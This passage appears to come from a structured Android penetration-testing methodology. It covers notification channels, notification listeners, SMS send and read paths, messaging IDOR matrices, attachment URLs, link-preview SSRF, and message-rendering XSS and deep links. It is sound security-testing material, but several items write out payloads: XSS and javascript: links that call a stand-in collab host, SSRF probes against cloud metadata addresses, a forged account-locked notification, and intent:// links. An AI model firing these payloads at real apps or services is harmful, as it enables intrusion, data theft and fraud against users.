- **Skip when:** `grep -rlE 'android_channel_id|setChannelId\(' "$DEC/jadx/sources" | wc -l` = 0 and the handler uses one constant channel — write `n/a — D24-026: channel fixed in code (file:line)`.
- **Test:** D20-030 settles whether each channel is visible on the keyguard. This item asks who picks the
  channel: if the sender does, a sensitive message can be posted on the public, high-importance channel
  the user keeps for promotions, with full lock-screen content and heads-up.
- **How:**
```bash
adb -s "$SERIAL" shell dumpsys notification --noredact | grep -oE 'NotificationChannel\{[^}]+\}' | grep -oE 'mId=[^,]+|mImportance=[0-9]+|mLockscreenVisibility=-?[0-9]+' | paste - - - | tee "$E/logs/D24-026.txt"
grep -rnE 'android_channel_id|getChannelId\(|setChannelId\(' "$DEC/jadx/sources" | head
# self-send the OTP / message-class payload with  --es 'gcm.n.android_channel_id' '<public channel id>'  (or the handler's own channel key) and read the posted entry's channel
```
- **Proof:** The self-sent sensitive-class content posted on a `mLockscreenVisibility=1` channel chosen
  by the payload, while the app's default channel for that content is private.
- **Escalation:** → D20-030 for the rating; → D24-012 for the content class.
- **Ruled out when:** The handler maps content type to a fixed channel and ignores payload channel ids
  (file:line; the canary with a foreign channel id posts on the default channel), or every selectable
  channel is private with a public version.

### D24-027 · Notification posted under the app's identity from an untrusted local trigger — the PoC standard for D05-017

| | |
|---|---|
| **Severity ceiling** | Medium; High when the tap target or text leads to a credential prompt |
| **VRT** | as D05-017 |
| **Attacker** | AM-03 |
| **Applies to** | Any exported receiver, activity or deep link whose extras reach `notify()`. D05-017 owns the receiver variant; this item owns the activity and deep-link variants and the evidence standard for all three. |
| **Requires** | device |
| **Maps to** | MASWE-0018; MASTG-TEST-0366; D05-017; D09 (deep-link trigger); `docs/04-poc-and-evidence-standard.md` |
| **Record** | `logs/D24-027.txt`; `pocs/F-NNN/` (probe-app manifest, the rendered screenshot, the tap target) |

- **Test:** A forged notification is only a finding when it is (a) rendered under the vendor's icon,
  (b) triggered from a principal with no permissions or from a link, and (c) leads somewhere — a deep link
  to a credential prompt or a WebView. Evidence standard: the probe app's `requestedPermissions=[]` line,
  the drawer screenshot with canary text, the tap and its destination, and the same payload refused by
  the hardened path as the negative control.
- **How:**
```bash
grep -rnE 'NotificationManagerCompat\.from\(|\.notify\(' "$DEC/jadx/sources" | head -20
# map each notify() back to its trigger: an exported activity's getIntent() extras (D04), a deep-link parameter (D09), or a receiver extra (D05-017)
# probe app: fire the trigger with  --es 'title' 'Your account is locked' --es 'deeplink' 'targetapp://web?url=https://zq7x4mk9.collab.example/login'
```
- **Proof:** As D05-017, plus the tap destination and the collab-host hit that proves the deep link.
- **Escalation:** → D24-013 / D24-014 for where the tap lands; → D04 for the redress argument.
- **Ruled out when:** As D05-017: the content comes from an authenticated server fetch keyed on a
  server-issued id and the extras are only a cache key — show the fetch.

### D24-028 · The app as a `NotificationListenerService` consumer — where other apps' notifications go

| | |
|---|---|
| **Severity ceiling** | High when other apps' OTPs or message bodies leave the device; Medium for on-device retention beyond the stated purpose |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies) |
| **Attacker** | n/a — the app itself is the actor (privacy class); AM-09 for the backend that receives the content |
| **Applies to** | Apps declaring a `NotificationListenerService` ("OTP autofill", "message sync", "smart replies", wearable bridges) |
| **Requires** | device, frida |
| **Maps to** | MASWE-0069; MASWE-0073; MASTG-TEST-0319; ATT&CK T1517; D20-031 (building the PoC listener), D20-032 and D22-047 (OTP redaction and its route-arounds), D13-050 |
| **Record** | `logs/D24-028.txt` (hook output + the proxy line); `requests/E-NNN.http` |

- **Skip when:** `grep -rlE 'extends NotificationListenerService' "$DEC/jadx/sources" | wc -l` = 0 and the manifest declares no `BIND_NOTIFICATION_LISTENER_SERVICE` service — write `n/a — D24-028: the app is not a notification listener`.
- **Test:** The listener grant reads every app's notifications. Read `onNotificationPosted` to its sinks:
  does it filter by package, what fields does it keep, and does any of it reach the network or a database?
  A canary notification from another package that appears in the proxy is the finding; one that is stored
  in the app's own DB is the retention variant.
- **How:**
```bash
grep -rnE 'extends NotificationListenerService|onNotificationPosted\(' "$DEC/jadx/sources" | head
cat > "$E/frida/d24-028.js" <<'JS'
Java.perform(function () {
  var L = Java.use('android.service.notification.NotificationListenerService');
  L.onNotificationPosted.overload('android.service.notification.StatusBarNotification').implementation = function (sbn) {
    console.log('[D24-028] ' + sbn.getPackageName() + ' ' + sbn.getNotification().extras.toString()); return this.onNotificationPosted(sbn);
  };
});
JS
frida -D "$SERIAL" -n "$PKG" -l "$E/frida/d24-028.js" -q -t 300 | tee "$E/logs/D24-028.txt" &
adb -s "$SERIAL" shell "cmd notification post -t 'D24-028' 'd24tag' 'canary 7731 from another package'"   # or any second app you own
```
- **Proof:** The hook shows the foreign package's text entering the app, and the proxy or a DB dump shows
  it leaving the device or persisted.
- **Escalation:** → D20-032 / D22-047 when the app obtained a companion-device association to keep
  reading OTPs; → D20 data-collection declarations (MASWE-0073).
- **Ruled out when:** The listener filters to a documented package allow-list (file:line) and the canary
  from another package appears neither in the proxy nor in any file under the app's data directory.

### D24-029 · Direct-boot-aware push handler running before first unlock — the push-triggered DE write or crash

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | rated on the consequence — a token or payload written to device-protected storage (D11-025) or an action taken before unlock |
| **Attacker** | AM-01 with a send path; AM-10 for the locked device whose DE storage is then readable |
| **Applies to** | Messaging services or receivers declared `android:directBootAware="true"` |
| **Requires** | push, device |
| **Maps to** | MASWE-0001; D11-025 (DE storage), D05-059 (the receiver attribute) |
| **Record** | `logs/D24-029.txt` (file listing of `/data/user_de/0/$PKG` before and after; logcat) |

- **Skip when:** `grep -c 'directBootAware="true"' "$DEC/apktool/AndroidManifest.xml"` = 0 — write `n/a — D24-029: no direct-boot-aware component`.
- **Test:** A direct-boot-aware handler runs after reboot while credential-encrypted storage is still
  locked. Two failure shapes: it writes the payload or the refreshed token into device-protected storage
  (readable without the PIN), or it fails open and performs the action with whatever state DE holds.
- **How:**
```bash
grep -B2 -A4 'directBootAware="true"' "$DEC/apktool/AndroidManifest.xml" | grep -E 'service|receiver'
grep -rnE 'createDeviceProtectedStorageContext\(|isUserUnlocked\(' "$DEC/jadx/sources" | head
adb -s "$SERIAL" shell "ls -laR /data/user_de/0/$PKG" > "$E/logs/D24-029-before.txt"; adb -s "$SERIAL" reboot
# do NOT unlock; wait for boot; deliver a push (the D24-004 root harness works on a userdebug AVD without unlock), then:
adb -s "$SERIAL" shell "ls -laR /data/user_de/0/$PKG" > "$E/logs/D24-029-after.txt"; diff "$E/logs/D24-029-before.txt" "$E/logs/D24-029-after.txt" | tee "$E/logs/D24-029.txt"
adb -s "$SERIAL" logcat -d | grep -E "$PKG|AndroidRuntime" | tail -40 >> "$E/logs/D24-029.txt"
```
- **Proof:** A new or grown file under `/data/user_de/0/$PKG/` containing the payload or token after a
  pre-unlock delivery, or a crash trace naming the locked CE path.
- **Escalation:** → D11-025 for what DE storage then exposes; → D24-016 when the pre-unlock action is a
  backend call.
- **Ruled out when:** No component in the push path is direct-boot aware (manifest grep 0): the provider
  queues the message until unlock, which the trial confirms (nothing in the diff, delivery after unlock).

### D24-030 · Push delivered into the wrong profile — work profile and Private Space instances

| | |
|---|---|
| **Severity ceiling** | Low; Medium when the private-space instance's content is shown while the space is locked |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies) |
| **Attacker** | AM-11 — whoever holds the unlocked handset with the private space locked |
| **Applies to** | Apps installed in more than one profile on the same device (work profile, Private Space on Android 15+) |
| **Requires** | push, device, api>=35 |
| **Maps to** | D22-049 (Private Space enumeration), D11-065 (profile separation), D23-014 (install-keyed state) |
| **Record** | `logs/D24-030.txt` (dumpsys per user id) |

- **Skip when:** device API < 35 and no work profile is provisioned (`adb -s "$SERIAL" shell pm list users` shows one user) — write `n/a — D24-030: single-profile device, API <35`.
- **Test:** Each profile's instance registers its own token and its own account. The platform hides a
  locked Private Space's notifications; the app can defeat that by keying registration on a device-wide
  identifier (one token row for two instances) or by syncing notification state across profiles.
- **How:**
```bash
adb -s "$SERIAL" shell pm list users
adb -s "$SERIAL" shell "pm install --user <private-space user id> -r /data/local/tmp/base.apk"   # or install from the Private Space UI
# sign in as A in the main profile and B in the private space; lock the space; trigger B's event; then:
adb -s "$SERIAL" shell dumpsys notification --noredact | grep -B2 -A8 "pkg=$PKG" | grep -E 'user=|text=' | tee "$E/logs/D24-030.txt"
```
- **Proof:** B's content posted under the main profile's user id, or shown while the Private Space is
  locked.
- **Escalation:** → D11-065 for the storage boundary; → D23-014 when the same key multiplies an
  entitlement.
- **Ruled out when:** Each instance registers its own token under its own account (two registration
  requests with different tokens in the proxy) and the locked-space trial shows nothing in the main
  profile's drawer.

### D24-031 · One-time tokens and privileged routes inside notification extras — read by a listener, replayed as the user

| | |
|---|---|
| **Severity ceiling** | High; Critical when the token logs in or approves |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) when the replayed route authenticates; `sensitive_data_exposure.sensitive_token_in_url.user_facing` (P4) otherwise |
| **Attacker** | AM-04 — a notification listener the user granted |
| **Applies to** | Apps whose notification deep links carry a signature, a magic-link token or an action token (`token=`, `sig=`, `auth=`, `otp=`) in `contentIntent` extras or in `EXTRA_TEXT` |
| **Requires** | push, device |
| **Maps to** | MASWE-0037; MASTG-TEST-0315; D09-039 (notification-origin trust), D20-031 (the listener PoC), D13-056 (reset and magic-link tokens), D08-040 (harvesting the PendingIntent itself) |
| **Record** | `logs/D24-031.txt` (listener output with the token redacted; the replay trace); `pocs/F-NNN/` |

- **Test:** The router trusts "came from a notification" (D09-039); the listener reads the notification.
  Join them: a listener reads the deep link and its one-time parameter out of the extras and starts the
  route itself, as the user, from its own process — no PendingIntent harvest needed.
- **How:**
```bash
grep -E 'token=|sig=|auth=|otp=|code=' "$E/logs/D24-002.txt" | tee "$E/logs/D24-031.txt"
# D20-031 PoC listener: log sbn.getNotification().extras and contentIntent; then from the listener's process:
#   startActivity(Intent.parseUri('<the deep link with its token>', 0))   — before the user taps
```
- **Proof:** The route reached (authenticated screen, approval completed, login) from the listener's
  replay, with the notification that carried the token.
- **Escalation:** → D13-056 when the token is a reset or magic link; → D08-040 when the mutable
  `PendingIntent` is the better acquisition; → D24-047 when it approves.
- **Ruled out when:** Notification deep links carry only server-chosen ids and the privileged route
  re-authenticates in-app (D09-039 ruled out), and the D24-002 capture shows no token-like parameter.

### D24-032 · `SmsManager.send*` with an attacker-controlled destination or body reachable from an exported surface

| | |
|---|---|
| **Severity ceiling** | High — premium-rate toll fraud and SMS from the victim's number |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies); `sensitive_data_exposure.disclosure_of_secrets.pay_per_use_abuse` (P4) for the billing framing |
| **Attacker** | AM-03 (exported component) / AM-02 (deep link) |
| **Applies to** | Apps holding `SEND_SMS` or the default-SMS role whose send call takes destination or body from an Intent extra, a deep-link parameter or a WebView bridge |
| **Requires** | device |
| **Maps to** | MASWE-0018; CWE-862; ATT&CK T1582 (SMS control), T1643 (generate traffic from victim); D03-031 (permission re-delegation), D03-058 (the role) |
| **Record** | `logs/D24-032.txt`; `pocs/F-NNN/` (probe-app log and the received message on your own test number) |

- **Skip when:** the manifest holds no `SEND_SMS` and no SMS role, and `grep -rlE 'SmsManager|sendTextMessage\(' "$DEC/jadx/sources" | wc -l` = 0 — write `n/a — D24-032: no SMS send capability`.
- **Test:** `sendTextMessage(dest, null, body, …)` fed from an exported surface lets a zero-permission
  app send SMS from the victim's number — to a premium short code, or as a phishing text to the victim's
  contacts. The platform's own confirmation dialog applies only to premium destinations it recognises
  and only for non-default-SMS apps, so read the code path, do not assume the dialog.
- **How:**
```bash
grep -rnE 'sendTextMessage\(|sendMultipartTextMessage\(|sendDataMessage\(|SmsManager' "$DEC/jadx/sources" | head
# trace each call's dest/body back to an Intent extra, a URI parameter or a bridge argument (D04 / D09 / D10 inventories)
# probe app: fire the surface with  --es 'to' '<your own test number>' --es 'body' 'd24-032 canary'  — never a number you do not own
```
- **Proof:** The canary text arriving on your own test number, sent from the victim device, from a probe
  with `requestedPermissions=[]` (or from a tapped link), with the surface that carried it.
- **Escalation:** → D13-052 / D13-071 when the SMS is the vendor's recovery or verification channel; →
  D03-031 for the re-delegation framing.
- **Ruled out when:** Every send call takes its destination from app-owned state (file:line) and the
  probe's attempt produces no message on the test number; or the app holds no SMS permission and no SMS
  role (manifest).

### D24-033 · Default-SMS-role components — exported by necessity, so the MMS/WAP parsers are the surface

| | |
|---|---|
| **Severity ceiling** | Medium standalone; High / Critical as the D16 delivery vector |
| **VRT** | `application_level_denial_of_service_dos.app_crash.malformed_android_intents` (P5) for a crash alone; rated on the D16 sink when the parser is a memory-safety bug |
| **Attacker** | AM-01 — a message to the victim's number; AM-03 for the explicit-component variant |
| **Applies to** | Apps that register `SMS_DELIVER`, `WAP_PUSH_DELIVER` or `RESPOND_VIA_MESSAGE` (the default-SMS-role contract requires them exported). The role's read/write/erase consequences are D03-058. |
| **Requires** | device |
| **Maps to** | MASWE-0050; MASWE-0044; D03-058 (owner of the role), D16-036 (0-click paths), D25-036 (vendor parser extraction) |
| **Record** | `logs/D24-033.txt`; `logs/D24-033-fuzz/` (inputs and crashes, hashed) |

- **Skip when:** `grep -cE 'SMS_DELIVER|WAP_PUSH_DELIVER|RESPOND_VIA_MESSAGE' "$DEC/apktool/AndroidManifest.xml"` = 0 — write `n/a — D24-033: no default-SMS-role component`.
- **Test:** These components must be exported; the finding is what the handler does with a hostile MMS
  (PDU, SMIL, attachment), a WAP push or a `RESPOND_VIA_MESSAGE` body. Native or third-party decoders
  behind them are reachable by anyone who can text the number — the purest AM-01 on the device.
- **How:**
```bash
grep -B2 -A8 -E 'SMS_DELIVER|WAP_PUSH_DELIVER|RESPOND_VIA_MESSAGE' "$DEC/apktool/AndroidManifest.xml" | grep -E 'name=|permission=|mimeType'
grep -rnE 'getMessagesFromIntent\(|PduParser|SmilHelper|application/vnd\.wap|GenericPdu' "$DEC/jadx/sources" | head
# explicit-component delivery of one malformed MMS part (lab device, own numbers) and the logcat tail; route a reproducible crash to D16 with the entry point
```
- **Proof:** A reproducible crash or decoder fault from a received object, with the entry point and the
  input hash — filed through D16, not as a P5 crash.
- **Escalation:** → D16-036 (the zero-click argument), → D25-036 for a vendor parser; → D03-058 for the
  provider write/erase consequences of the role.
- **Ruled out when:** The handler stores the PDU bytes and renders through platform decoders only
  (file:line), and a bounded fuzz of the parts (count printed, D24-005) produces no fault.

### D24-034 · SMS read scope and retention beyond the OTP — `content://sms` queries and inbox sync to the backend

| | |
|---|---|
| **Severity ceiling** | High (privacy) when unrelated messages leave the device; Medium for over-broad local reads |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies) |
| **Attacker** | n/a — the app is the actor (privacy class); AM-09 for the backend that receives the inbox |
| **Applies to** | Apps holding `READ_SMS` / `RECEIVE_SMS` or the SMS role (D13-050 covers the posture question: why not SMS Retriever?) |
| **Requires** | device, frida |
| **Maps to** | MASWE-0069; MASWE-0073; MASTG-TEST-0319; ATT&CK T1636.004; D13-050, D13-048 |
| **Record** | `logs/D24-034.txt` (hook output: every SMS URI queried, with the selection); `requests/E-NNN.http` (the sync call) |

- **Skip when:** the manifest holds no `READ_SMS`/`RECEIVE_SMS` and no SMS role, and `grep -rlE 'content://sms|Telephony\.Sms' "$DEC/jadx/sources" | wc -l` = 0 — write `n/a — D24-034: no SMS read capability (SMS Retriever only, D13-050)`.
- **Test:** An OTP reader needs one message matching one pattern for one minute. Hook `ContentResolver
  .query` for `content://sms*` URIs and read the selection: an unbounded inbox read, a periodic sync, or a
  body upload to the backend is the finding, independent of the OTP use that justified the permission.
- **How:**
```bash
grep -rnE 'content://sms|Telephony\.Sms|SMS_RECEIVED|getMessagesFromIntent' "$DEC/jadx/sources" | head
cat > "$E/frida/d24-034.js" <<'JS'
Java.perform(function () {
  var CR = Java.use('android.content.ContentResolver');
  CR.query.overload('android.net.Uri','[Ljava.lang.String;','java.lang.String','[Ljava.lang.String;','java.lang.String').implementation = function (u, p, s, a, o) {
    if (u.toString().indexOf('sms') >= 0) console.log('[D24-034] query ' + u + ' sel=' + s + ' proj=' + (p ? Java.use('java.util.Arrays').toString(p) : null));
    return this.query(u, p, s, a, o);
  };
});
JS
frida -D "$SERIAL" -n "$PKG" -l "$E/frida/d24-034.js" -q -t 300 | tee "$E/logs/D24-034.txt" &
# plant a canary SMS on the lab device from your own number ("d24-034 canary 5519"), drive the OTP flow, then grep the proxy for the canary
```
- **Proof:** A query with no sender/time selection (or a sync route) and the canary from an unrelated SMS
  in the proxy or in the app's database.
- **Escalation:** → D13-048 (the OTP channels); → D20 for the data-collection declaration (MASWE-0073).
- **Ruled out when:** Every SMS query is bounded to the sender and a time window (hook output), nothing
  SMS-derived leaves the device for the canary, and the receiver drops non-matching bodies (file:line).

### D24-035 · RCS and business-messaging integration — capability discovery as number enumeration, sender identity from the client

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_access_control.username_enumeration.non_brute_force` (P4) for the presence oracle; `server_side_injection.content_spoofing.external_authentication_injection` (P4) when the client chooses the verified sender |
| **Attacker** | AM-05 / AM-01 |
| **Applies to** | Apps that query RCS capabilities (`ImsRcsManager`, `RcsUceAdapter`) or use a business-messaging backend that stamps a verified sender; verify the carrier and platform API names on the installed build before citing them |
| **Requires** | backend-api |
| **Maps to** | CWE-200; CWE-346; ATT&CK T1437.001 |
| **Record** | `logs/D24-035.txt` (the counted sweep); `requests/E-NNN.http` |

- **Skip when:** `grep -rlE 'ImsRcsManager|RcsUceAdapter|capabilit(y|ies)' "$DEC/jadx/sources" | wc -l` = 0 and no business-messaging route is in the endpoint map — write `n/a — D24-035: no RCS or business-messaging integration`.
- **Test:** Two halves. (a) A capability or presence lookup that answers for arbitrary numbers tells the
  caller which numbers are live users — an enumeration oracle keyed on phone number. (b) A business-
  messaging send whose sender identity, display name or "verified" badge is a client-supplied field lets
  one tenant message as another.
- **How:** Capture the capability lookup and the send; replay the lookup for a bounded list of numbers
  you own plus one known-unused (count printed, D24-005) and diff the answers; replay the send with the
  sender fields swapped to a second tenant you own.
- **Proof:** Per-number presence returned without a relationship or rate limit; or a message delivered
  under a sender identity the caller does not own.
- **Escalation:** → D13-047 / D13-052 for the phone-number recovery chain; → D24-011 for the delivery
  clause.
- **Ruled out when:** Lookups are limited to the caller's own contacts with a server-side relationship
  check (diff is empty for the unused number) and the sender identity is derived from the tenant's
  credential, not the body (swap ignored — body diff).

### D24-036 · Message-object IDOR matrix — message, attachment, reaction, mention, poll, call log across fetch, edit, delete and forward

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1); `broken_access_control.idor.modify_view_sensitive_information_guid` (P4) when the id is an unleaked v4 UUID (D15-039 lifts it) |
| **Attacker** | AM-05 |
| **Applies to** | Every app with user-to-user messaging, comments, support chat or shared inboxes. Support-ticket objects are D15-049; this item owns the chat matrix. |
| **Requires** | backend-api, two-accounts |
| **Maps to** | CWE-639; CWE-862; D15-049, D15-039, D15-058 |
| **Record** | `logs/D24-036.txt` (the matrix with one line per cell); `requests/E-NNN.http` per confirmed cell |

- **Skip when:** `grep -ciE 'message|conversation|chat|attachment' inventory/endpoints.csv` prints 0 after the P3 gate — write `n/a — D24-036: no messaging objects in the endpoint map`; with no account B, write `blocked — D24-036: needs account B` instead.
- **Test:** Run it as a table, not a tour: rows = object types (conversation, message, attachment,
  reaction, mention, poll / vote, voice note, call log, read receipt), columns = verbs (fetch, edit,
  delete, forward, report, pin). Each cell: B's id with A's session. The cells that fail most often are the
  ones with their own id space — attachments, reactions and polls — because the conversation check was
  written for the conversation.
- **How:** From the endpoint map, take every route with a message-class id; with two accounts you own,
  create one object of each type in B's conversation (with a third account you own as the peer), then
  issue each verb with A's session and B's id. Python, counted (D24-005), body diff per cell.
- **Proof:** B's object content returned, changed or removed by A — the body diff and the two requests
  per cell.
- **Escalation:** → D24-037 (attachment URLs), → D24-044 (delete-for-everyone), → D24-016 when a push
  makes the victim's client perform the same call.
- **Ruled out when:** Every cell returns the same response for B's id as for a random id (scoped lookup,
  diff empty), with the matrix recorded in full — a half-run matrix is `untested`, not negative.

### D24-037 · Attachment and media URLs unauthenticated, unexpiring or surviving deletion

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies); `broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3) when the object key is guessable |
| **Attacker** | AM-01 (anyone with the URL) / AM-05 |
| **Applies to** | Messaging, support and sharing features that serve attachments from a CDN or object store |
| **Requires** | backend-api, two-accounts |
| **Maps to** | CWE-639; CWE-613; D15-053 (share-token reuse), D24-044 |
| **Record** | `logs/D24-037.txt`; `requests/E-NNN.http` (the curl without a session, the re-fetch after deletion) |

- **Skip when:** no attachment or media route in the endpoint map and no media URL in any captured message — write `n/a — D24-037: messaging carries no attachments`.
- **Test:** Three fetches settle it: the attachment URL from `curl` with no session; the same URL a day
  later or after the signed expiry; the same URL after the message is deleted. A URL that is a bare
  object key (no signature, no expiry) is readable by anyone who ever saw it — forwarded, screenshotted,
  logged by a proxy, or guessed.
- **How:**
```bash
grep -oE 'https?://[^" ]+(\.(jpg|png|mp4|pdf|aac|ogg)|/attachments?/)[^" ]*' "$E/logs/D24-002.txt" "$E/requests/"*.http 2>/dev/null | sort -u | head
# for one URL you own: curl -s -o /dev/null -w '%{http_code}\n' '<url>'  (no cookie, no header)  — then delete the message in-app and repeat; then wait past the stated expiry and repeat
```
- **Proof:** `200` and the bytes with no session, after deletion, or after expiry; a sequential or
  short object key makes it the IDOR variant (count the sweep, D24-005).
- **Escalation:** → D24-044 when "delete for everyone" leaves the media; → D24-038 when a preview fetcher
  can be pointed at it; → D15-053 for share tokens.
- **Ruled out when:** URLs are signed with a short expiry and a session-bound fetch (the no-session curl
  returns 403 with the same body as a random key; the post-expiry fetch fails; deletion invalidates within
  the stated window — all three recorded).

### D24-038 · Link previews — on-device fetches leak the recipient; server-side fetchers are SSRF

| | |
|---|---|
| **Severity ceiling** | High for the server-side fetcher reaching internal addresses; Medium for the recipient-IP leak |
| **VRT** | `server_security_misconfiguration.server_side_request_forgery_ssrf.internal_data_exposure` (P3) — up to `.internal_secrets_exposure` (P2) on a cloud metadata hit; `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies) for the on-device fetch that exposes the recipient's IP and user agent to a sender's host |
| **Attacker** | AM-05 — one message with a link |
| **Applies to** | Messaging features that render link previews or unfurl URLs |
| **Requires** | backend-api, two-accounts |
| **Maps to** | CWE-918; CWE-200; MASWE-0050 |
| **Record** | `logs/D24-038.txt` (the collab-host request log: source IP, UA, timing); `requests/E-NNN.http` |

- **Skip when:** sending a canary URL from A to B produces no preview in B's client and no fetch at the collab host within ten minutes — write `n/a — D24-038: no link previews (canary unfetched)`.
- **Test:** Send a canary URL from A to B and watch the collab host. A request from B's IP with the
  app's user agent before B taps is an on-device fetch that de-anonymises the recipient and parses
  attacker HTML in-app; a request from the vendor's range is a server-side fetcher — point it at
  `http://127.0.0.1`, an internal hostname and the cloud metadata address and read what the preview
  returns.
- **How:**
```bash
# A → B: message containing https://zq7x4mk9.collab.example/d24-038-<nonce> ; record who fetched it and when (before any tap)
# server-side: send http://169.254.169.254/latest/meta-data/ , http://127.0.0.1:80/ , http://<internal-name>/ and read the preview title/description/image fields in the API response
grep -rnE 'OpenGraph|og:title|unfurl|linkPreview|Jsoup|readability' "$DEC/jadx/sources" | head   # on-device parser present?
```
- **Proof:** The collab-host log line with the fetching IP and UA; for the server side, preview fields
  containing bytes from an internal address.
- **Escalation:** → D15 for the SSRF write-up (the preview route is the entry); → D24-040 when the
  on-device parser renders the fetched HTML.
- **Ruled out when:** Previews are generated by the sender's client only (the collab host sees A, never B
  and never a vendor IP) and the on-device renderer takes text fields only (file:line).

### D24-039 · Media auto-download into shared storage readable by other apps, EXIF intact

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_external_storage` (P4); `sensitive_data_exposure.exif_geolocation_data_not_stripped_from_uploaded_images.manual_user_enumeration` (P4) for location metadata that survives the pipeline |
| **Attacker** | AM-04 — an app holding `READ_MEDIA_IMAGES` / `READ_MEDIA_VIDEO`; AM-05 for the EXIF half (the sender's location reaches the recipient) |
| **Applies to** | Messaging apps that save received media to `Pictures/`, `Download/` or `DCIM/` via MediaStore or legacy external paths |
| **Requires** | device |
| **Maps to** | MASTG-TEST-0200; MASWE-0002; MASWE-0069; D11-044, D11-045 (MediaStore columns and insert control), D20-002 (markers) |
| **Record** | `logs/D24-039.txt` (`exiftool` / `identify` output and the probe's read); `screenshots/D24-039-1.png` |

- **Skip when:** `grep -rlE 'MediaStore\.(Images|Video|Downloads)|getExternalStoragePublicDirectory' "$DEC/jadx/sources" | wc -l` = 0 and the shared collections show nothing after a received-media trial — write `n/a — D24-039: received media stays app-private`.
- **Test:** Received media written to shared storage is readable by any app with the media permission —
  the attachment the sender meant for one person is now in every gallery-reading app's reach — and media
  that keeps EXIF GPS carries the sender's location to the recipient (and to those apps). Two trials:
  receive an image with a canary GPS tag; read it back from a second app.
- **How:**
```bash
grep -rnE 'MediaStore\.(Images|Video|Downloads)|RELATIVE_PATH|getExternalStoragePublicDirectory|DIRECTORY_PICTURES' "$DEC/jadx/sources" | head
# send from B an image carrying EXIF GPS (set with exiftool on the host) to A; then on A's device:
adb -s "$SERIAL" shell "ls -la /sdcard/Pictures/ /sdcard/Download/ 2>/dev/null | grep -i '$(date +%Y)'" | tee "$E/logs/D24-039.txt"
adb -s "$SERIAL" pull '/sdcard/Pictures/<app folder>/<file>' /tmp/d24-039.jpg && exiftool /tmp/d24-039.jpg | grep -i gps | tee -a "$E/logs/D24-039.txt"
```
- **Proof:** The file under a shared collection with the GPS tag intact, read back by a second app you own
  holding only the media permission.
- **Escalation:** → D11-045 when the sender controls the filename or subdirectory; → D16 when the
  auto-download decodes the file without a tap (D24-015 pattern).
- **Ruled out when:** Received media stays under the app's private directory until the user exports it
  (file:line; the shared collections show nothing after the trial), and the upload path strips EXIF
  (the pulled file has no GPS tag).

### D24-040 · Received-message rendering — markdown, HTML and mention injection into a WebView or `Html.fromHtml` with `javascript:` / `intent:` links

| | |
|---|---|
| **Severity ceiling** | High; Critical with a bridge or the session in the rendering WebView |
| **VRT** | `cross_site_scripting_xss.stored.non_admin_to_anyone` (P2) when script runs; `server_side_injection.content_spoofing.html_content_injection` (P5) when only markup renders |
| **Attacker** | AM-05 — one message |
| **Applies to** | Messaging, comment and support features whose renderer is a WebView, `Html.fromHtml`, a markdown library with raw-HTML enabled, or a rich-text span builder that makes links clickable |
| **Requires** | backend-api, two-accounts |
| **Maps to** | CWE-79; MASWE-0035; MASWE-0050; MASTG-TEST-0398; MASTG-KNOW-0018 |
| **Record** | `logs/D24-040.txt`; `screenshots/D24-040-1.png` (the rendered payload on B's device); `requests/E-NNN.http` |

- **Skip when:** the message renderer is a plain `TextView` path with no HTML, markdown or `Linkify` call (`grep -rlE 'Html\.fromHtml\(|Markwon|commonmark|Linkify' "$DEC/jadx/sources" | wc -l` = 0) — write `n/a — D24-040: plain-text rendering (file:line)`.
- **Test:** The sender's bytes are rendered in the recipient's process. Find the renderer, then send the
  payloads that match it: `<img onerror>` and `<a href="javascript:">` for a WebView; `<a
  href="intent://…">` and `<a href="targetapp://…">` for `Html.fromHtml` with `Linkify` (a tap on a
  styled link is the D09 payload); a mention token that resolves to a display name you control.
- **How:**
```bash
grep -rnE 'Html\.fromHtml\(|Markwon|commonmark|Linkify|setMovementMethod|loadDataWithBaseURL\(' "$DEC/jadx/sources" | grep -iE 'message|chat|comment|bubble' | head
# A → B payloads (one per message, counted): <img src=x onerror="fetch('https://zq7x4mk9.collab.example/xss')">  ·  <a href="javascript:fetch('https://zq7x4mk9.collab.example/js')">tap</a>  ·  [tap](intent://x#Intent;scheme=targetapp;package=$PKG;end)
```
- **Proof:** The collab host hit from B's device without a tap (script), or the D09 route opened on tap
  from a message link; the message request that carried it.
- **Escalation:** → D10-004 (bridge in the rendering WebView), → D24-041 (auto-handled links), → D09
  for the route reached.
- **Ruled out when:** Messages render as plain text (file:line of the `TextView` path with no HTML
  parsing), or the renderer strips tags and schemes server-side (the payload comes back escaped in the API
  response — body shown).

### D24-041 · Received-message links auto-handled as deep links — `intent://`, custom schemes, no confirmation

| | |
|---|---|
| **Severity ceiling** | High — one message is a D09 payload |
| **VRT** | rated on the route reached — the D09 / D10 node of the sink |
| **Attacker** | AM-05 (a message) — stronger than AM-02 because no browser is involved |
| **Applies to** | Messaging features whose link handler resolves `intent:` URIs or the app's own schemes, or opens links in the in-app WebView |
| **Requires** | deeplink, device |
| **Maps to** | MASWE-0029; MASTG-TEST-0394; MASTG-KNOW-0138; D09-063 (`file://` / `content://` into a reading sink), D24-040 |
| **Record** | `logs/D24-041.txt` (frida/03 trace of the route taken); `screenshots/D24-041-1.png` |

- **Skip when:** `inventory/deeplinks.csv` is empty and links open in the system browser (trace shows `ACTION_VIEW` to the browser for one canary link) — write `n/a — D24-041: no in-app link handling`.
- **Test:** A link in a chat bubble is tapped with far more trust than a link in a browser. If the tap
  handler parses `intent://` URIs, routes the app's own scheme without the browser path's allow-list, or
  opens the URL in the session WebView, every D09 finding becomes "send one message".
- **How:**
```bash
grep -rnE 'parseUri\(|shouldOverrideUrlLoading|onLinkClick|URLSpan|CustomTabsIntent' "$DEC/jadx/sources" | grep -iE 'message|chat|link' | head
